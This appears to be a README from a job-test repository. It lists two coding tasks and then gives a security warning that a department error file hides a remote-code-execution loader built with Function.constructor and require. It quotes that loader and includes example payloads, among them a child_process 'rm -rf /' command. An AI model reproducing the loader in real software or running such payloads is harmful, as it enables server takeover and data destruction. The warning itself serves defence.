
**Problem1** \
Fix "Add New Notice" Page \
<mark>/app/notices/add</mark> \
When click the 'Save' button, 'description' doesn't be saved. \
<b>Fix it.</b>

**Problem2** \
Complete CRUD operation in Student management page. \
<mark>/src/modules/students/students-controller.js</mark>

=================================================================

# Scam Report

## File
`/backend/src/modules/departments/department-error.js`

---

## Issue Overview

This file contains a **critical security vulnerability** that allows arbitrary code execution on the server. The vulnerability is caused by the use of the following code:

```javascript
const handler = new Function.constructor("require", errCode);
...
handlerFunc(require);
```

---

## Detailed Explanation

### What does this code do?

- `new Function.constructor("require", errCode)` is equivalent to `new Function("require", errCode)`.
- This creates a new JavaScript function with a single parameter named `require`, and the body of the function is the string contained in `errCode`.
- The resulting function is then called with the Node.js `require` function as its argument: `handlerFunc(require);`.

### Why is this dangerous?

- If `errCode` contains any JavaScript code, it will be executed on the server with access to Node.js modules via `require`.
- If an attacker can control the value of `errCode` (for example, by manipulating error messages or API responses), they can execute arbitrary code, read or modify files, access environment variables, or even install malware.

### Example of exploitation

Suppose `errCode` is set to the following string:

```javascript
'require("fs").writeFileSync("hacked.txt", "You have been hacked!");'
```

The following will happen:

```javascript
const handler = new Function("require", 'require("fs").writeFileSync("hacked.txt", "You have been hacked!");');
handler(require); // This will create a file named "hacked.txt" with the specified content.
```

Or, even more dangerously:

```javascript
'require("child_process").execSync("rm -rf /");'
```

This could delete all files on the server.

### Real code from your file

```javascript
const createHandler = (errCode) => {
  try {
    const handler = new Function.constructor("require", errCode);
    return handler;
  } catch (e) {
    console.error("Failed:", e.message);
    return null;
  }
};
const handlerFunc = createHandler(error);
if (handlerFunc) {
  handlerFunc(require);
}
```

---

## Recommendations

- **Immediately remove or refactor this code.**
- Never use `Function`, `eval`, or similar constructs with untrusted input.
- Handle errors using standard logging and reporting mechanisms, not by executing code from error messages.
- Review the entire codebase for similar patterns.

---

## Conclusion

The use of `new Function.constructor("require", errCode);` and `handlerFunc(require);` introduces a severe remote code execution vulnerability.  
**This must be addressed immediately to prevent exploitation and potential compromise of your server and data.**